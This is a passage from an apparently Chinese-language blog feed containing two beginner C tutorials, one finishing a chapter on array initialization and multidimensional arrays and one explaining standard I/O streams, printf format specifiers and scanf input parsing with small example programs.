class="number">6</span>, <span class="number">7</span>, [<span class="number">9</span>] = <span class="number">3</span>&#125;;</span><br><span class="line">    <span class="comment">// 等价于</span></span><br><span class="line">    <span class="comment">// int a[10] = &#123;0&#125;;</span></span><br><span class="line">    <span class="comment">// a[2] = 1;</span></span><br><span class="line">    <span class="comment">// a[5] = 2;</span></span><br><span class="line">    <span class="comment">// a[9] = 3;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024160309066.png" alt="image-20231024160309066" style="zoom:50%;" /><p>对于一般的初始化,在初始化一个元素后,未初始化的元素都会被设置为0.</p><p>并且需要注意上面的例子中,[5]之后的6,7继续顺延到对[6],[7]进行赋值.</p><h2 id="未知大小数组">未知大小数组</h2><p>如果我们忽略数组长度,那么这就是一个不完整的类型.关于这个问题不好解释,可以去找标准参阅.</p><p>如果我们这样写,我们需要使用初始化列表来进行初始化,以便编译器确定数组的长度,否则,编译器会因无法得知数组的大小而无法分配空间,导致报错.</p><p><code>初始化列表</code>中表达式的个数就会成为数组长度,另一方面,如果使用了<code>指定初始化器</code>,则会保证数组能够容纳下所有的元素,例如有<code>=&#123;[5]=3&#125;</code>,则数组的长度为6,刚好能容纳下元素[5].</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组a的长度为10.</p><h2 id="字符数组的初始化">字符数组的初始化</h2><p>字符数组的初始化有个特例,我们不仅可以像这样正常的为字符数组进行逐个赋值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 字符数组的初始化有个特例,我们不仅可以像这样正常的为字符数组进行逐个赋值:</span></span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>]=&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;;</span><br><span class="line">    <span class="comment">// char a[100]=&quot;hello world&quot;;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024161013244.png" alt="image-20231024161013244" style="zoom:50%;" /><p>我们还可以直接使用一个字符串常量对其进行赋值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 字符数组的初始化有个特例,我们不仅可以像这样正常的为字符数组进行逐个赋值:</span></span><br><span class="line">    <span class="type">char</span> a[<span class="number">100</span>]=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024161013244.png" alt="image-20231024161013244" style="zoom:50%;" /><p>效果是一样的,因为逐个赋值依旧是初始化列表,后面的<code>'\0'</code>字符串结束标志,也就是整数0同样被默认填充.</p><p>而使用字符串常量,进行的是复制操作,结尾的<code>'\0'</code>同样会被添加.</p><p>关于这方面的内容,后面讲解字符串时会进行详细讨论.</p><h2 id="非常量长度数组">非常量长度数组</h2><p>必须首先强调的是,<code>非常量长度数组</code>,或者叫<code>变长数组</code>,再或者缩写为<code>VLA</code>,目前的兼容性不好,例如VS默认的msvc编译器就不支持这种用法.</p><p>另外<code>VLA</code>是在C99引入的.</p><p>简单的说就是可以使用变量来声明数组,不是很建议使用,这里仅给出一个简单的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n); <span class="comment">// 输入10</span></span><br><span class="line">    <span class="type">int</span> a[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        a[i] = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024162521152.png" alt="image-20231024162521152" style="zoom:50%;" /><h1 id="二维数组">二维数组</h1><p>二维数组实际上,就是&quot;数组的数组&quot;,即一个数组的每个元素都是数组.读者自行想象,最终结果就是实现一个NxM的矩阵.</p><p>有些问题光有一维(线性)的数组是不够的,我们需要&quot;二维的&quot;空间来存储,例如一张迷宫的地图.此时,就需要所谓的二维数组.</p><p>必须指出的是,所谓的二维,包括可能用到的更多维数组,都是逻辑上的划分,实际上数组全部都是线性的,也就是说,它们仍然在内存上排成一列,只不过是把这一长串的内存划分成几个大块,每一块都是一个子数组,作为整个数组的一个元素来使用.</p><h2 id="二维数组的声明">二维数组的声明</h2><p>我们十分容易能够将一维推广到二维:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>];</span><br></pre></td></tr></table></figure><p>这将声明一个&quot;3行4列&quot;的二维数组,类似这样:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024163941327.png" alt="image-20231024163941327" style="zoom:50%;" /><p>事实上,在底层,它仍然是一段连续的内存单元,也就是长为3x4xsizeof(int),也就是3x4x4=48个字节的连续内存:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024164414243.png" alt="image-20231024164414243" style="zoom:50%;" /><p>只不过我们从逻辑上将其转换为一个相对&quot;立体&quot;的矩阵而已,底层上,仍然是线性存储的.</p><p>所以有一句话:“C语言没有二维数组”,这句话就是针对C的底层逻辑来描述的,当然,这不影响我们简单地将其视为二维来解释,事实上,既然C能够有这种写法,当然就是为了满足我们对多维数组的需求.</p><p>关于这方面的详细内容,我们将会在学习指针之后展开详细讨论(注:这是难点)</p><p>回到声明,我们可以看到,第一个[]代表第一维(可以理解为行),第二个[]代表第二维(可以理解为列),<code>int a[3][4]</code>就声明了一个3行4列的二维数组.</p><p>对其访问也十分简单,例如我们要访问第2行第3列的元素,其下标为<code>[1][2]</code>—下标仍然从0开始</p><p>则该元素就是<code>a[1][2]</code></p><h2 id="二维数组的初始化">二维数组的初始化</h2><p>对于初始化列表,同样可以应用于二维数组,我们既可以直接用一个花括号初始化所有的元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;;</span><br></pre></td></tr></table></figure><p>我们还可以进行嵌套,这样更加直观,可以很容易地看出我们正在初始化的是哪一行:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">            &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,</span><br><span class="line">            &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>这两种写法等价,不过建议使用第二种方法,更为清晰.</p><p>例如我们可以输出1,2,3,4,…,12这些数组成的3x4的矩阵:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">            &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">            &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,</span><br><span class="line">            &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231024165611507.png" alt="image-20231024165611507" style="zoom:50%;" /><p>至于多维数组,均同理:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>][<span class="number">5</span>]; <span class="comment">// 声明一个三维数组</span></span><br></pre></td></tr></table></figure><p>但是一般用的比较少,大多数情况下,二维数组就已经能满足各种需求了.</p><br><p>本章简单讲解了数组的使用方法,至于更加深入的内容,在没有讲解指针之前,都无法特别清楚的进行讨论.</p><br><br><p>上一篇:<a href="../2023-09-30-a60ec9bcedd8">C语言教程-9-运算符及其优先级和求值顺序</a></p><p>下一篇:<a href="../2023-10-06-b45ef26d6ec3">C语言教程-11-字符串</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-3_2-基本输入输出</title>
      <link href="/2023-10-18-427f4611cc41/"/>
      <url>/2023-10-18-427f4611cc41/</url>
      
        <content type="html"><![CDATA[<h1 id="理解输入输出">理解输入输出</h1><h2 id="什么是交互">什么是交互</h2><p>程序是为人服务的,程序计算出来的所有数据,最终都以各种不同的方式来间接或直接地提供给我们,也就是<code>输出</code>.</p><p>同样,程序在运行时,我们往往也需要为其提供一些必要的数据,作为<code>输入</code>.</p><p>程序根据我们输入的信息来进行处理,并将结果显示出来.</p><p>最基本的输入输出操作,就是在控制台屏幕使用键盘进行交互,我们将需要输入的数据使用<code>键盘</code>来输入,程序将需要输出的数据显示在<code>屏幕</code>上.这种输入输出叫做<code>标准输入输出</code>.</p><p>在<code>标准输入输出</code>中,往往使用<code>电脑显示器</code>来作为标准输出的目标,使用<code>键盘</code>来作为标准输入的来源.</p><p>本章我们要讲的就是<code>标准输入输出</code>,也就是<code>Standard input/output</code>.即简单地使用键盘输入,从屏幕上看到输出信息.</p><h2 id="什么是流">什么是流</h2><p>许多资料都会引入<code>流</code>这个概念,输入输出也是一种流.</p><p><code>流(Stream)</code>是一个抽象的概念,表示数据从一个地方流向另一个地方，或者数据从一个源生成，并最终被传递到目的地。流可以是字节流（以字节为单位处理数据）或字符流（以字符为单位处理数据).</p><p>我们之前存储的数据全部是固定存储在某个地方,我们直接通过地址等方式进行引用即可找到,但是流数据不同.</p><p>可以将存储的数据类比为水池中的水,流数据类比为水流.存储的数据是<code>相对固定的</code>,我们可以反复进行存取,例如电脑中存储的一张照片,一段视频;而流数据往往代表的是某个数据源<code>即时生成的</code>数据,直接依次传输到目的地,例如键盘读取的一系列敲击操作.</p><p>标准输入输出就是这样的一类流.</p><p>在进行<code>标准输入</code>时,也即从键盘进行读取,键盘就是一个<code>标准输入流设备</code>,从键盘读入的数据不需要进行<code>缓冲</code>,直接逐个进行传输即可,就像<code>水流</code>一样.</p><p>同理,在进行<code>标准输出</code>是,也即向屏幕显示,也是将其视为数据流来&quot;流&quot;向屏幕(实际上是终端),并逐个打印到屏幕上.</p><p>或者,读者可能知道<code>&quot;流媒体&quot;</code>这个概念.与键盘这样的<code>流设备</code>对应的,还有<code>块设备</code>,例如硬盘,它们需要一个成块的空间来进行<code>缓冲</code>,数据的读取是成块成块的.</p><p>关于<code>流</code>的简单讲解就这么多,我们只需要知道,本章讲解的就是对标准输入输出流进行操作.</p><h1 id="c语言对标准输入输出的支持">C语言对标准输入输出的支持</h1><h2 id="stdio-h">stdio.h</h2><p>我们前面看到很多程序的开头都有<code>#include &lt;stdio.h&gt;</code>这行指令,但是并没有深究其作用,实际上,它就是为我们的程序提供了标准输入输出的支持.</p><p><code>#include预处理指令</code>用于引入头文件,这里引入的就是C标准库的<code>stdio.h</code>头文件,这个头文件中定义,声明了有关输入输出的各种内容.想必各位可能已经意识到,<code>stdio</code>,即<code>standard in/out</code>的缩写.</p><p>当然,C可以支持的输出输出不仅仅有标准IO(即标准输入输出,以下均简写为标准IO),还有文件IO,网络IO,内存IO等等,它们往往更加复杂,需要更多的处理,但是殊途同归,它们都是数据操作,并且往往都是视为流去处理.</p><p>在stdio.h中有许多函数声明,和一些常用的宏,下面进行简单列举:</p><h2 id="输入输出函数">输入输出函数</h2><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>scanf()函数</td><td>用于格式化输入</td></tr><tr><td>printf()函数</td><td>用于格式化输出</td></tr><tr><td>puts()函数</td><td>用于输出字符串,并自动加上换行符</td></tr><tr><td>gets()函数</td><td>输入一个字符串,同时会接受除了<code>'\n'</code>的其他空白字符.(由于有严重的安全缺陷已弃用)</td></tr><tr><td>putchar()函数</td><td>输出单个字符</td></tr><tr><td>getchar()函数</td><td>输入单个字符</td></tr></tbody></table><h2 id="三个流">三个流</h2><table><thead><tr><th>预定义</th><th>关联</th></tr></thead><tbody><tr><td>#define stdin  /* implementation-defined */</td><td>标准输入流</td></tr><tr><td>#define stdout /* implementation-defined */</td><td>标准输出流</td></tr><tr><td>#define stderr /* implementation-defined */</td><td>标准错误流</td></tr></tbody></table><p>这些宏展开成 <a href="http://zh.cppreference.com/w/c/io">FILE</a>* 类型表达式(即它们是文件指针)</p><h1 id="常用函数讲解">常用函数讲解</h1><h2 id="c风格字符串">C风格字符串</h2><p>这里简单讲解一下字符串:</p><p>C语言中,字符串是由一对<code>&quot;&quot;</code>和其包括起来的任意数量的字符组成.</p><p>例如,我们想要表示<code>Hello world!</code>这行字符串,就是这么写:</p><p><code>&quot;Hello world!&quot;</code></p><p>任何可以放到char变量中的字符,都可以出现在字符串中.</p><h2 id="printf-函数">printf()函数</h2><h3 id="基本用法">基本用法</h3><p>函数原型如下:</p><p><code>int printf( const char *restrict format, ... );</code></p><p>printf函数名实际就是print formatted的缩写,意即打印格式化的字符串.</p><p>可以看到printf函数的第一个参数是一个字符串,后面可以继续接任意个数的其他参数(函数参数的内容将在后面讲解函数时详细展开).</p><p>函数的返回值为最终打印的字符个数.</p><p>printf()函数用于根据我们的格式要求生成一个最终的字符串,来打印到我们的终端(输出),这个字符串可以由多个字符串,多个整数,多个字符,多个浮点数等等拼接而成.</p><p>参数的第一个字符串就是用于描述这些数据如何进行拼装的,也即所谓的格式化字符串,用于描述输出格式.</p><p>我们说的各个数据就是后面可以追加的若干任意数量的参数,它们可以是任意数据类型的值.</p><p>printf函数的最基本用法就是输出一个字符串常量:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 此代码中格式化字符串中没有任何格式字符,仅仅是输出了一个普通的字符串</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是printf函数的强大是体现在这个格式化字符串的,这个字符串中可以加入一些指定好的<code>格式指示符</code>,来进行额外的格式化操作,举一个简单的例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> i = <span class="number">123</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello%5d!&quot;</span>,i);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018151927825.png" alt="image-20231018151927825" style="zoom: 50%;" /><p>可以看到123前面有2个空格,<code>&quot;  123&quot;</code>一共占用5个字符的宽度,即格式化字符串中的%5d用于将后面的第一个整型参数i输出,并保证至少占用5位的宽度,并插入到其他的<code>&quot;Hello&quot;</code>和<code>&quot;!&quot;</code>中间,最终生成<code>&quot;Hello  123!&quot;</code>这个字符串打印到终端.</p><p>这里<code>%5d</code>就是一种<code>格式指示符</code>,与此类似的<code>格式指示符</code>还有很多,我们列举一些常用的.</p><h3 id="格式指示符">格式指示符</h3><p>这里引用了《C Primer Plus (第6版)》的内容:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018154428429.png" alt="image-20231018154428429"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018154451517.png" alt="image-20231018154451517"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018154512241.png" alt="image-20231018154512241"></p><p>读者请自行理解试验,需要用到哪种控制符可以去查找表格学习用法.</p><h3 id="注意">注意</h3><p>1.对于浮点数,为了安全起见,printf函数将所有float类型的参数都提升为double类型(对未使用显式类型原型的所有C函数都有效).</p><p>2.如果格式化字符串较长,可以在一行结尾加上<code>\</code>来转义换行符(下一行必须从最开始开始,否则缩进就会变成字符串的一部分),或者使用两个字符串进行拼接:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> sum = <span class="number">123</span>;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Hello \</span></span><br><span class="line"><span class="string">World!\n&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span></span><br><span class="line">            <span class="string">&quot;World!&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018155655371.png" alt="image-20231018155655371" style="zoom:50%;" /><p>3.还有一些表格中可能没有的格式指示符,例如<code>%s</code>,它用于输出一个字符串:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;Hello world!&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="scanf-函数">scanf()函数</h2><h3 id="基本用法">基本用法</h3><p>函数原型为:</p><p><code>int scanf( const char *restrict format, ... );</code></p><p>scanf()函数的功能和printf相反,它用于输入数据(scan意即&quot;扫描&quot;)</p><p>同时,它也接受一个格式字符串和若干准备输入的参数,与printf不同的是,scanf后面的若干参数必须是合法的<code>指针</code>.</p><p>函数的返回值为成功读取的参数个数.</p><p>读者此时不必疑惑<code>指针</code>这个概念,你需要知道相比于printf,scanf后面的参数之前需要加上一个<code>&amp;字符</code>(实际上是取地址运算符),用来获取期待输入值的这个变量的地址(指针).</p><p>实际上很简单,我们想要对一个变量进行输入,就需要知道他的存储位置.</p><p>同时,scanf的格式化字符串不允许使用像printf那样多样的<code>格式指示符</code>,我们仅仅需要使用例如:</p><p>%d来输入int类型的整数;</p><p>%s来输入字符串;</p><p>%f来输入float类型的浮点数;</p><p>%lf来输入double类型的浮点数;</p><p>%ld来输入long类型的整数…</p><p>等等…</p><h3 id="格式指示符">格式指示符</h3><p>C标准中的描述:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018160736236.png" alt="image-20231018160736236"></p><h3 id="举例">举例</h3><p>例如我们需要输入两个int类型的值,赋值给i,j,应该这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> i,j;</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, i, j);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018160936632.png" alt="image-20231018160936632" style="zoom: 50%;" /><p>注意到,scanf中的两个<code>%d</code>之间没有空格,我们输入时和printf中却需要空格,这是一个不同,事实上,scanf在输入整数/浮点数时,会不断读取,直到遇到不合法的字符为止—例如空格等空白符,逗号等字符.</p><p>该<code>%d</code>结束后,再继续读取下一个<code>%d</code>.</p><p>另一方面,scanf也允许使用一般字符,scanf会在读取时匹配这些字符(如果格式化字符串中有的话,则必须匹配,否则之后的变量会读取失败),然后简单地丢弃这个字符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>, k=<span class="number">0</span>;</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d%d&quot;</span>, &amp;i, &amp;j, &amp;k);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, i, j, k);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确的输入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018161749017.png" alt="image-20231018161749017" style="zoom:50%;" /><p>错误的输入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018161814337.png" alt="image-20231018161814337" style="zoom:50%;" /><p>可以看到后两个变量并没有被正确地赋值,或者我们也可以输出scanf的返回值(成功读取的变量个数)来观察:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>, k=<span class="number">0</span>,num=<span class="number">0</span>;</span><br><span class="line">     num = <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d%d&quot;</span>, &amp;i, &amp;j, &amp;k);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, i, j, k);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;num = %d&quot;</span>,num);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img 